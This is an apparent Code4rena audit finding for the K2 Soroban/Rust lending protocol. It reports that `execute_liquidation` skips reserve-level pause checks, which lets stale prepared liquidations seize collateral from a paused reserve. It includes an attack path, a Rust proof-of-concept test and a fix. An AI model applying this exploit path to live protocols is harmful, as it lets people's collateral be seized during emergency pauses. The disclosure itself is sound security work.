# [MEDIUM] `execute_liquidation` allows stale prepared liquidations to seize collateral after the collateral reserve is paused

```text
id         : W3-004
protocol   : K2 (Soroban / Rust lending protocol)
platform   : Code4rena audit 2026-04-k2, submission S-1492 (as duan)
severity   : medium
class      : missing pause check / stale authorization
status     : confirmed
affected   : router.rs#L700
```

Original submission: <https://code4rena.com/audits/2026-04-k2/submissions/S-1492>

## Summary

`execute_liquidation` does not revalidate reserve-level pause status for the collateral reserve when consuming a previously stored liquidation authorization. A liquidation authorization prepared before a collateral reserve is paused can still be executed within its validity window, allowing collateral to be seized from a paused market.

## Root cause

`prepare_liquidation` correctly checks both reserves:

```rust
if collateral_reserve_data.configuration.is_paused() {
    return Err(KineticRouterError::AssetPaused);
}
if debt_reserve_data.configuration.is_paused() {
    return Err(KineticRouterError::AssetPaused);
}
```

However, `execute_liquidation` only checks the global protocol pause:

```rust
if storage::is_paused(&env) {
    return Err(KineticRouterError::AssetPaused);
}
```

Later, `execute_liquidation` reloads fresh `debt_reserve_data` and `collateral_reserve_data`, but never checks whether either reserve has become paused since `prepare_liquidation`.

This breaks the reserve-level emergency pause invariant.

## Attack path

1. A liquidator calls `prepare_liquidation` while both `debt_asset` and `collateral_asset` reserves are active and unpaused.
2. The router stores a `LiquidationAuthorization` valid for 600 seconds.
3. Before the authorization expires, an emergency event occurs for the collateral reserve.
4. Admin / emergency admin pauses the collateral reserve using `set_reserve_pause(collateral_asset, true)`.
5. New `prepare_liquidation` calls are now correctly rejected because the collateral reserve is paused.
6. The liquidator calls `execute_liquidation` using the stale authorization.
7. `execute_liquidation` only checks the global protocol pause and does not check `collateral_reserve_data.configuration.is_paused()`.
8. The liquidation proceeds:
   - debt token is burned,
   - collateral aToken is burned,
   - paused collateral is transferred/seized,
   - collateral is swapped,
   - flash loan is repaid,
   - liquidator receives profit.

## Impact

The issue allows liquidation of collateral from a reserve after that reserve has been paused by the protocol. This undermines the purpose of reserve-level emergency pause, which is intended to halt operations for an affected asset during abnormal market conditions, oracle incidents, depegs, issuer freezes, or other emergencies.

The impact is not merely theoretical: the stale authorization can cause real state changes. User collateral is seized and debt is settled even though the collateral reserve has been paused.

This can lead to user losses during precisely the scenarios where admins pause a reserve to prevent unsafe liquidations or other market operations. The protocol may not suffer direct insolvency, but the emergency control is bypassed and users can be liquidated against a paused market.

## Likelihood

The attack requires several conditions:

- A valid `prepare_liquidation` authorization must exist before the collateral reserve is paused.
- The liquidator must execute within the authorization window, currently 600 seconds.
- The global protocol pause must not be enabled.
- The debt reserve must not be paused, because the flash loan path checks the debt reserve.
- The user must remain liquidatable at execution time.
- Price movement must stay within the liquidation price tolerance.
- If liquidation whitelist is enabled, the liquidator must be authorized.

These constraints reduce likelihood, but the scenario is realistic. Liquidator bots can prepare and execute liquidations quickly, and reserve pause is most likely to be used during volatile or abnormal market conditions where liquidations are already active.

## Proof of concept

<details>
<summary>Full test</summary>

```rust
fn test_submission_validity() {
    let env = Env::default();
    let setup = Setup::new(&env);

    // ---------- Sanity check: protocol is in a known, functional state ----------

    // The user has starting balances of both assets, pre-approved to the router.
    assert_eq!(
        setup.asset_a_token.balance(&setup.user),
        USER_STARTING_BALANCE,
        "user should start with USER_STARTING_BALANCE of asset_a",
    );
    assert_eq!(
        setup.asset_b_token.balance(&setup.user),
        USER_STARTING_BALANCE,
        "user should start with USER_STARTING_BALANCE of asset_b",
    );

    // A plain supply round-trips through the router cleanly, proving that the
    // router, oracle, reserves, aToken, debtToken, and interest-rate strategy
    // are all correctly wired up.
    let deposit: u128 = 5_000_000_000; // 500 whole tokens of asset_a
    setup
        .router
        .supply(&setup.user, &setup.asset_a, &deposit, &setup.user, &0u32);

    let account = setup.router.get_user_account_data(&setup.user);
    assert!(
        account.total_collateral_base > 0,
        "collateral should be tracked after supply",
    );
    assert_eq!(account.total_debt_base, 0, "no debt yet");
    assert_eq!(
        account.health_factor,
        u128::MAX,
        "health factor should be infinite with no debt",
    );

    // ---------- WARDEN: add your PoC below this line ----------
    let liquidator = Address::generate(&env);
    let swap_handler = env.register(MockSwapHandler, ());
    let mut whitelisted_handlers = Vec::new(&env);
    whitelisted_handlers.push_back(swap_handler.clone());
    setup
        .router
        .set_swap_handler_whitelist(&whitelisted_handlers);

    // Fund the handler so the mocked swap can return debt_asset to the router.
    setup
        .asset_b_mint
        .mint(&swap_handler, &1_000_000_000_000i128);

    // User borrows safely at the original $1 collateral price.
    let borrow_amount: u128 = 3_800_000_000; // 380 whole tokens of asset_b
    setup.router.borrow(
        &setup.user,
        &setup.asset_b,
        &borrow_amount,
        &1u32,
        &0u32,
        &setup.user,
    );

    // Make the account liquidatable before prepare_liquidation. There is no
    // price movement between prepare and execute; the bug is solely that the
    // collateral reserve pause is not rechecked during execute_liquidation.
    let collateral_oracle_asset = OracleAsset::Stellar(setup.asset_a.clone());
    setup
        .oracle
        .reset_circuit_breaker(&setup.admin, &collateral_oracle_asset);
    setup.oracle.set_manual_override(
        &setup.admin,
        &collateral_oracle_asset,
        &Some(PRICE_ONE_DOLLAR * 80 / 100),
        &Some(env.ledger().timestamp() + 604_800),
    );

    let underwater = setup.router.get_user_account_data(&setup.user);
    assert!(
        underwater.health_factor < k2_shared::WAD,
        "setup error: user must be liquidatable before preparing auth",
    );

    let min_swap_out = 0u128;
    let auth = setup.router.prepare_liquidation(
        &liquidator,
        &setup.user,
        &setup.asset_b,
        &setup.asset_a,
        &borrow_amount,
        &min_swap_out,
        &Some(swap_handler.clone()),
    );

    // Emergency action after TX1: pause the collateral reserve. This is exactly
    // what pool configurator's set_reserve_pause() does before calling router.
    let mut collateral_reserve = setup.router.get_reserve_data(&setup.asset_a);
    collateral_reserve.configuration.data_low |= 1u128 << 53;
    setup.router.update_reserve_configuration(
        &setup.pool_configurator,
        &setup.asset_a,
        &collateral_reserve.configuration,
    );
    let paused_collateral_reserve = setup.router.get_reserve_data(&setup.asset_a);
    assert_ne!(
        paused_collateral_reserve.configuration.data_low & (1u128 << 53),
        0,
        "setup error: collateral reserve should be paused",
    );

    // A fresh prepare is correctly blocked once the collateral reserve is paused.
    let fresh_prepare = setup.router.try_prepare_liquidation(
        &liquidator,
        &setup.user,
        &setup.asset_b,
        &setup.asset_a,
        &borrow_amount,
        &min_swap_out,
        &Some(swap_handler.clone()),
    );
    assert!(
        fresh_prepare.is_err(),
        "setup error: reserve pause should block new liquidation prepares",
    );

    let user_collateral_before = a_token::Client::new(&env, &setup.a_token_a).balance(&setup.user);
    let user_debt_before = debt_token::Client::new(&env, &setup.debt_token_b).balance(&setup.user);
    assert!(
        auth.collateral_to_seize > 0 && user_collateral_before > 0 && user_debt_before > 0,
        "setup error: prepared liquidation should have collateral and debt to settle",
    );

    let deadline = env.ledger().timestamp() + 300;
    let execute_result = setup.router.try_execute_liquidation(
        &liquidator,
        &setup.user,
        &setup.asset_b,
        &setup.asset_a,
        &deadline,
    );
    match execute_result {
        Ok(Ok(())) => {}
        other => panic!(
            "bug not demonstrated: stale execute_liquidation should not fail after collateral reserve pause: {:?}",
            other
        ),
    }

    let user_collateral_after = a_token::Client::new(&env, &setup.a_token_a).balance(&setup.user);
    let user_debt_after = debt_token::Client::new(&env, &setup.debt_token_b).balance(&setup.user);
    assert!(
        user_collateral_after < user_collateral_before,
        "bug: execute_liquidation seized paused collateral reserve",
    );
    assert!(
        user_debt_after < user_debt_before,
        "bug: execute_liquidation settled debt using stale prepared authorization",
    );
}
```

</details>

## Fix

Revalidate reserve-level state inside `execute_liquidation` after fresh reserve data is loaded and before any liquidation side effects occur.

At minimum, add checks after loading/updating `debt_reserve_data` and `collateral_reserve_data`:

```rust
if !collateral_reserve_data.configuration.is_active()
    || !debt_reserve_data.configuration.is_active()
{
    return Err(KineticRouterError::AssetNotActive);
}

if collateral_reserve_data.configuration.is_paused()
    || debt_reserve_data.configuration.is_paused()
{
    return Err(KineticRouterError::AssetPaused);
}
```

This should mirror the checks already present in `prepare_liquidation` and `validate_liquidation`.
